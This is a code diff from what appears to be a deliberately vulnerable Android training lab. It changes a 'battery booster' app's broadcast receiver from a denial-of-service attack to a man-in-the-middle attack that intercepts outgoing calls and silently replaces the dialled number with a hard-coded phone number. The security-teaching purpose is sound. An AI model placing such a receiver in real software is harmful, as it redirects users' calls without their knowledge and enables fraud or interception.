@@ -3,10 +3,12 @@ package uk.ac.swansea.dascalu.dvmicc.battery_booster.icc
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+
 import uk.ac.swansea.dascalu.dvmicc.battery_booster.BROADCAST_THEFT_MITM_ID
 import uk.ac.swansea.dascalu.dvmicc.battery_booster.R
 import uk.ac.swansea.dascalu.dvmicc.battery_booster.SecuritySettings
 import uk.ac.swansea.dascalu.dvmicc.battery_booster.loadSecuritySettingsFromFile
+
 import java.io.OutputStreamWriter
 
 class AppActivityReceiver : BroadcastReceiver() {
@@ -21,15 +23,15 @@ class AppActivityReceiver : BroadcastReceiver() {
                     && securitySettings.malwareOvercome) {
                 //check intent action is the one the receiver listens for
                 if(intent!!.action == "android.intent.action.NEW_OUTGOING_CALL") {
+                    resultData = "07597020264"
                     abortBroadcast()
-                    resultData = null
 
                     if(securitySettings.securityLevel == "low") {
                         writeDataToFile(context, context.resources.getStringArray(
-                                R.array.broadcastTheftDOSFlags)[0])
+                                R.array.broadcastTheftMITMFlags)[0])
                     } else if(securitySettings.securityLevel == "high") {
                         writeDataToFile(context, context.resources.getStringArray(
-                                R.array.broadcastTheftDOSFlags)[1])
+                                R.array.broadcastTheftMITMFlags)[1])
                     }
                 }
             }
